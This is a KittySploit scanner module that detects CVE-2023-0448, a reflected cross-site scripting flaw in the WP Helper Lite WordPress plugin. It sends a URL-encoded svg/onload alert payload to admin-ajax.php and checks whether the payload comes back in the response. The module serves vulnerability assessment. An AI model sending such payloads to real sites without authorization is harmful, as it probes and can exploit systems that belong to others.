#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The WP Helper Lite WordPress plugin, in versions < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Helper Lite < 4.3 - Cross-Site Scripting Detection',
        'description': 'The WP Helper Lite WordPress plugin, in versions < 4.3, returns all GET parameters unsanitized in the response, resulting in a reflected cross-site scripting vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wordpress', 'wp', 'wp-plugin', 'wpscan', 'xss', 'wp-helper-lite', 'matbao', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/1f24db34-f608-4463-b4ee-9bc237774256',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-0448',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/JoshuaMart/JoshuaMart',
        ],
        'cve': 'CVE-2023-0448',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=surveySubmit&a=%22%3E%3Csvg%20onload%3Dalert%28document.domain%29%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('><svg onload=alert(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason='WP Helper Lite < 4.3 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

